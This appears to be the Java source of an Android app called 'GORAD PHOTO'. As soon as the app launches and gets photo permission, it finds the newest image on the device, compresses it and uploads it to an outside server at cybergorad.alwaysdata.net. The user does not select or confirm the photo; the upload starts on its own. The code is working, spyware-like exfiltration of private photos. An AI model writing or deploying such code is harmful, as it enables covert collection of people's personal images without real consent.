package com.myapp;

import android.app.Activity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 200;
    private TextView statusText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 150, 50, 50);
        layout.setGravity(Gravity.CENTER);

        TextView title = new TextView(this);
        title.setText("GORAD PHOTO");
        title.setTextSize(32);
        title.setTextColor(Color.parseColor("#00FF41"));
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 30);

        statusText = new TextView(this);
        statusText.setText("⏳ Initialisation...");
        statusText.setTextSize(18);
        statusText.setPadding(0, 30, 0, 0);
        statusText.setGravity(Gravity.CENTER);

        layout.addView(title);
        layout.addView(statusText);
        setContentView(layout);

        // Lancer immédiatement la vérification + envoi automatique
        demanderPermission();
    }

    private void demanderPermission() {
        boolean permissionAccordee = false;

        if (Build.VERSION.SDK_INT >= 33) {
            permissionAccordee = checkSelfPermission("android.permission.READ_MEDIA_IMAGES") 
                == PackageManager.PERMISSION_GRANTED;
            if (!permissionAccordee) {
                requestPermissions(new String[]{"android.permission.READ_MEDIA_IMAGES"}, PERMISSION_REQUEST_CODE);
            }
        } else if (Build.VERSION.SDK_INT <= 30) {
            permissionAccordee = checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) 
                == PackageManager.PERMISSION_GRANTED;
            if (!permissionAccordee) {
                requestPermissions(new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_REQUEST_CODE);
            }
        } else {
            permissionAccordee = true;
        }

        if (permissionAccordee) {
            lancerEnvoiAutomatique();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                lancerEnvoiAutomatique();
            } else {
                statusText.setText("❌ Permission refusée.\nImpossible d'accéder aux photos.");
                statusText.setTextColor(Color.RED);
            }
        }
    }

    private void lancerEnvoiAutomatique() {
        statusText.setText("⏳ Recherche de la dernière photo...");
        statusText.setTextColor(Color.parseColor("#FFA500"));

        new Thread(() -> {
            Uri imageUri = trouverDernierePhoto();
            
            if (imageUri == null) {
                runOnUiThread(() -> {
                    statusText.setText("❌ Aucune photo trouvée sur l'appareil.");
                    statusText.setTextColor(Color.RED);
                });
                return;
            }

            runOnUiThread(() -> {
                statusText.setText("⏳ Compression et envoi automatique...");
                statusText.setTextColor(Color.parseColor("#FFA500"));
            });

            ResultatEnvoi resultat = compresserEtEnvoyer(imageUri);

            runOnUiThread(() -> {
                if (resultat.succes) {
                    statusText.setText("✅ PHOTO ENVOYÉE AUTOMATIQUEMENT !\n\n" + resultat.message);
                    statusText.setTextColor(Color.parseColor("#00AA00"));
                } else {
                    statusText.setText("❌ ERREUR D'ENVOI\n\n" + resultat.message);
                    statusText.setTextColor(Color.RED);
                }
            });
        }).start();
    }

    private Uri trouverDernierePhoto() {
        String[] projection = new String[]{
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATE_ADDED
        };
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        Cursor cursor = getContentResolver().query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null, sortOrder
        );

        if (cursor != null && cursor.moveToFirst()) {
            int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            long id = cursor.getLong(idColumn);
            cursor.close();
            return Uri.withAppendedPath(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 
                String.valueOf(id)
            );
        }
        if (cursor != null) cursor.close();
        return null;
    }

    private static class ResultatEnvoi {
        boolean succes;
        String message;
        ResultatEnvoi(boolean succes, String message) {
            this.succes = succes;
            this.message = message;
        }
    }

    private ResultatEnvoi compresserEtEnvoyer(Uri imageUri) {
        String urlString = "https://cybergorad.alwaysdata.net/upload.php"; // ⚠️ ADAPTEZ L'URL
        String boundary = "*****";
        String lineEnd = "\r\n";
        String twoHyphens = "--";

        try {
            InputStream is = getContentResolver().openInputStream(imageUri);
            Bitmap originalBitmap = BitmapFactory.decodeStream(is);
            is.close();

            if (originalBitmap == null) {
                return new ResultatEnvoi(false, "Impossible de lire l'image.");
            }

            int maxSize = 1024;
            int width = originalBitmap.getWidth();
            int height = originalBitmap.getHeight();
            if (width > maxSize || height > maxSize) {
                float ratio = Math.min((float) maxSize / width, (float) maxSize / height);
                width = Math.round(width * ratio);
                height = Math.round(height * ratio);
                originalBitmap = Bitmap.createScaledBitmap(originalBitmap, width, height, true);
            }

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            originalBitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
            byte[] imageBytes = baos.toByteArray();
            baos.close();
            originalBitmap.recycle();

            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"photo.jpg\"" + lineEnd);
            dos.writeBytes("Content-Type: image/jpeg" + lineEnd);
            dos.writeBytes(lineEnd);

            dos.write(imageBytes);
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();

            int responseCode = conn.getResponseCode();
            
            InputStream responseStream = responseCode == 200 
                ? conn.getInputStream() 
                : conn.getErrorStream();
            String responseMessage = "";
            if (responseStream != null) {
                byte[] respBuffer = new byte[1024];
                int respRead;
                while ((respRead = responseStream.read(respBuffer)) != -1) {
                    responseMessage += new String(respBuffer, 0, respRead);
                }
                responseStream.close();
            }

            String debug = "Code HTTP : " + responseCode + "\n";
            debug += "Dimensions : " + width + "x" + height + "\n";
            debug += "Taille : " + (imageBytes.length / 1024) + " Ko\n";
            debug += "Serveur : " + responseMessage;

            return new ResultatEnvoi(responseCode == 200, debug);

        } catch (Exception e) {
            e.printStackTrace();
            return new ResultatEnvoi(false, "Exception : " + e.getClass().getSimpleName() + "\n" + e.getMessage());
        }
    }
}
